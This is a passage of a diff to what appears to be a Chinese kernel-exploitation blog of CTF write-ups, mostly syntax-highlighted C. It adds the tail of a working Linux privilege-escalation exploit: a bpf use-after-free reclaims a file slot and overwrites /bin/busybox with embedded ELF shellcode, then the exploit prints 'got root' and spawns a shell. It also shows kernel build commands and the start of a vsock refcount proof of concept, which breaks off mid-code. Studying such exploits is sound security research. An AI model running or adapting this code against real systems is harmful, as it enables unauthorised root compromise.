+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] got root</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">trigger_vuln</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// return bpf(BPF_MAP_CREATE, map_attrs);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{};</span>
+</span></span><span class="line"><span class="cl">    <span class="n">attr</span><span class="p">.</span><span class="n">map_fd</span> <span class="o">=</span> <span class="n">fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">bpf</span><span class="p">(</span><span class="mi">37</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">uaf_fd</span><span class="p">,</span><span class="n">ezfd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">operate_file</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">trigger_vuln</span><span class="p">(</span><span class="n">ezfd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">orw_elfcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x45</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x46</span><span class="p">,</span><span class="mh">0x2</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x2</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x3e</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x78</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x5</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x97</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x97</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x10</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0xb8</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0xb8</span><span class="p">,</span><span class="mh">0x2e</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x6d</span><span class="p">,</span><span class="mh">0x60</span><span class="p">,</span><span class="mh">0x66</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0x4</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0x2</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0xe7</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0xf6</span><span class="p">,</span><span class="mh">0xf</span><span class="p">,</span><span class="mh">0x5</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0xba</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0xc6</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x5f</span><span class="p">,</span><span class="mh">0x99</span><span class="p">,</span><span class="mh">0xf</span><span class="p">,</span><span class="mh">0x5</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">pthread_t</span> <span class="n">t1</span><span class="p">,</span> <span class="n">t2</span><span class="p">,</span> <span class="n">t3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">pid_t</span> <span class="n">pid</span> <span class="o">=</span> <span class="nf">getpid</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] pid: 0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ezfd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/tmp/ezfd&#34;</span><span class="p">,</span><span class="n">O_CREAT</span><span class="o">|</span><span class="n">O_RDWR</span><span class="p">,</span><span class="mo">0666</span><span class="p">);</span><span class="c1">//ref == 1
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="n">ezfd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">t1</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">operate_file</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span><span class="c1">//ref == 0 freed
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">pthread_join</span><span class="p">(</span><span class="n">t1</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">uaf_fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/tmp/uafd&#34;</span><span class="p">,</span><span class="n">O_CREAT</span><span class="o">|</span><span class="n">O_RDWR</span><span class="p">,</span><span class="mo">0666</span><span class="p">);</span><span class="c1">//uafd == ezfd ref == 1
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="n">uaf_fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;/tmp/uafd&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">uaf_fd</span><span class="p">,</span><span class="n">orw_elfcode</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">orw_elfcode</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">,</span><span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span><span class="n">MAP_SHARED</span><span class="p">,</span><span class="n">uaf_fd</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span><span class="c1">//ref == 2
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="n">ptr</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;mmap&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">uaf_fd</span><span class="p">);</span> <span class="c1">//ref == 1
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">close</span><span class="p">(</span><span class="n">ezfd</span><span class="p">);</span> <span class="c1">//ref == 0 freed
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fdd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/bin/busybox&#34;</span><span class="p">,</span><span class="n">O_RDONLY</span><span class="p">);</span> <span class="c1">//占位
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="n">fdd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;/bin/busybox&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="n">orw_elfcode</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">orw_elfcode</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
 </div><h2 id="aliyunctf-beebee-ebpf-helper">aliyunctf-beebee (ebpf helper)</h2>
 <h3 id="参考链接">参考链接</h3>
 <p><a href="https://xz.aliyun.com/news/17029?time__1311=eqUxn7DQoYqGT4mqGXnjAQU23SCDuCoD&amp;u_atoken=376da92ea48d553ee8cbb0c6fad03b37&amp;u_asig=0a472f9217404810112528104e00ef" target="_blank" rel="noopener noreffer ">https://xz.aliyun.com/news/17029?time__1311=eqUxn7DQoYqGT4mqGXnjAQU23SCDuCoD&u_atoken=376da92ea48d553ee8cbb0c6fad03b37&u_asig=0a472f9217404810112528104e00ef</a></p>
@@ -12063,6 +12451,215 @@ A: heap overflow (off by null| off by x)</p>
 </span></span><span class="line"><span class="cl">unar linux-6.6.75.tar.xz <span class="o">&amp;&amp;</span> rm linux-6.6.75.tar.xz
 </span></span><span class="line"><span class="cl"><span class="nb">cd</span> linux-6.6.75.tar.xz <span class="o">&amp;&amp;</span>  wget https://storage.googleapis.com/kernelctf-build/releases/lts-6.6.87/.config ./
 </span></span><span class="line"><span class="cl">make olddefconfig <span class="o">&amp;&amp;</span> make bzImage -j <span class="sb">`</span>nproc<span class="sb">`</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="poc分析">poc分析</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/vm_sockets.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define MAX_PORT_RETRIES	24	</span><span class="cm">/* net/vmw_vsock/af_vsock.c */</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define VMADDR_CID_NONEXISTING	42
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* Create socket &lt;type&gt;, bind to &lt;cid, port&gt; and return the file descriptor. */</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">vsock_bind</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cid</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">port</span><span class="p">,</span> <span class="kt">int</span> <span class="n">type</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">sockaddr_vm</span> <span class="n">sa</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="p">.</span><span class="n">svm_family</span> <span class="o">=</span> <span class="n">AF_VSOCK</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="p">.</span><span class="n">svm_cid</span> <span class="o">=</span> <span class="n">cid</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="p">.</span><span class="n">svm_port</span> <span class="o">=</span> <span class="n">port</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="p">};</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">fd</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_VSOCK</span><span class="p">,</span> <span class="n">type</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">perror</span><span class="p">(</span><span class="s">&#34;socket&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">bind</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sa</span><span class="p">)))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">perror</span><span class="p">(</span><span class="s">&#34;bind&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/* Test attempts to trigger a transport release for an unbound socket. This can
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * lead to a reference count mishandling.
+</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">sockets</span><span class="p">[</span><span class="n">MAX_PORT_RETRIES</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">sockaddr_vm</span> <span class="n">addr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">s</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">alen</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">s</span> <span class="o">=</span> <span class="nf">vsock_bind</span><span class="p">(</span><span class="n">VMADDR_CID_LOCAL</span><span class="p">,</span> <span class="n">VMADDR_PORT_ANY</span><span class="p">,</span> <span class="n">SOCK_SEQPACKET</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">alen</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">getsockname</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">alen</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">perror</span><span class="p">(</span><span class="s">&#34;getsockname&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">MAX_PORT_RETRIES</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="n">sockets</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">vsock_bind</span><span class="p">(</span><span class="n">VMADDR_CID_ANY</span><span class="p">,</span> <span class="o">++</span><span class="n">addr</span><span class="p">.</span><span class="n">svm_port</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">					<span class="n">SOCK_SEQPACKET</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nf">close</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// wait for input
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Setup Finished...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">getchar</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_VSOCK</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">s</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">perror</span><span class="p">(</span><span class="s">&#34;socket&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">connect</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="n">alen</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Unexpected connect() #1 success</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// connect() #1 failed: transport set, sk in unbound list.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
